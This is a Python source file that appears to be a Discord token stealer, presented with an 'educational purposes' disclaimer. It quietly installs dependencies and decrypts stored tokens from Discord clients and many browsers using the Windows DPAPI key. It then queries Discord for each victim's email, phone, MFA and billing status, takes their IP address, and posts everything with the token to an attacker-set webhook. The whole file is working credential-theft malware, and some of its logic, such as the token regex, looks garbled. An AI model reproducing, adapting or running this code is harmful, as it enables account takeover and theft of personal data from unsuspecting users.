# Disclaimer: This is only for entertainment and educational purposes.  
# I'm not responsible for what you do with it or any consequences.  
# Made by Vexi :3

webhook = "{placeholder_webhook}" # type: ignore

import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime

def pip_install(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

pip_install([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': os.path.join(ROAMING, 'discord'),
    'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
    'Lightcord': os.path.join(ROAMING, 'Lightcord'),
    'Discord PTB': os.path.join(ROAMING, 'discordptb'),
    'Opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
    'Opera GX': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
    'Amigo': os.path.join(LOCAL, 'Amigo', 'User Data'),
    'Torch': os.path.join(LOCAL, 'Torch', 'User Data'),
    'Orbitum': os.path.join(LOCAL, 'Orbitum', 'User Data'),
    'CentBrowser': os.path.join(LOCAL, 'CentBrowser', 'User Data'),
    'Chrome SxS': os.path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data', 'Default'),
    'Epic Privacy Browser': os.path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data', 'Default'),
    'Yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
    'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Iridium': os.path.join(LOCAL, 'Iridium', 'User Data', 'Default')
}

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def get_tokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\$\$'(.*)'\$\$.*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def get_key(path):
    scope = {"path": path, "json": json}
    exec("with open(path + f\"\\\\Local State\", \"r\") as file:\n"
         "\tkey = json.loads(file.read())['os_crypt']['encrypted_key']", scope)
    return scope.get("key")

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def main():
    done = []

    for x, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in get_tokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(get_key(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in done:
                    continue
                done.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=get_headers(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                params = urllib.parse.urlencode({"with_counts": True})
                guilds_res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=get_headers(token))).read().decode())
                guilds = len(guilds_res)

                nitro_res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=get_headers(token))).read().decode())
                has_nitro = bool(len(nitro_res) > 0)
                exp_date = None
                if has_nitro:
                    exp_date = datetime.datetime.strptime(nitro_res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                info = {
                    'username': res_json['username'],
                    'id': res_json['id'],
                    'email': res_json['email'],
                    'phone': res_json['phone'],
                    'verified': res_json['verified'],
                    'mfa_enabled': res_json['mfa_enabled'],
                    'locale': res_json.get('locale', 'Unknown')
                }

                embed = {
                    'embeds': [
                        {
                            'title': f"**Token grabbed!**",
                            'fields': [
                                {
                                    'name': 'Username',
                                    'value': f"```{info['username']}```",
                                    'inline': True
                                },
                                {
                                    'name': 'User ID',
                                    'value': f"```{info['id']}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Email',
                                    'value': f"```{info['email']}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Phone',
                                    'value': f"```{info['phone']}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Verified',
                                    'value': f"```{info['verified']}```",
                                    'inline': True
                                },
                                {
                                    'name': 'MFA/2SV',
                                    'value': f"```{info['mfa_enabled']}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Nitro',
                                    'value': f"```{has_nitro}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Nitro Expiry',
                                    'value': f"```{exp_date if has_nitro else 'None'}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Guilds',
                                    'value': f"```{guilds}```",
                                    'inline': True
                                },
                                {
                                    'name': 'IP',
                                    'value': f"```{get_ip()}```",
                                    'inline': True
                                },                                
                                {
                                    'name': 'Region',
                                    'value': f"```{info.get('locale', 'Unknown')}```",
                                    'inline': True
                                },
                                {
                                    'name': 'Token',
                                    'value': f"```{token}```",
                                    'inline': False
                                }
                            ],
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{info['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                }

                urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed).encode('utf-8'), headers=get_headers(), method='POST')).read().decode()

                urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed).encode('utf-8'), headers=get_headers(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

if __name__ == "__main__":
    main()
